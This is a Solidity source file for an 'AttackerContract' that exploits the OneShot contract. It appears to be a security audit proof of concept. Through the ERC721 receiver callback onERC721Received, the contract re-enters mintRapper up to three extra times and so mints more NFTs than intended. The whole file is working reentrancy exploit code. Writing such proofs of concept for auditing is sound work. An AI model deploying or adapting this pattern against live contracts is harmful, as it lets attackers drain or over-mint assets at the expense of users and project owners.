// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {OneShot} from "../src/OneShot.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract AttackerContract is IERC721Receiver {
    OneShot public oneShotContract;

    uint256 count;

    constructor(address _oneShotContract) {
        oneShotContract = OneShot(_oneShotContract);
    }

    function attack() public {
        oneShotContract.mintRapper();
    }

    // Implementing IERC721Receiver so the contract can accept ERC721 tokens
    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4) {
        if (count < 3) {
            count++;
            oneShotContract.mintRapper();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
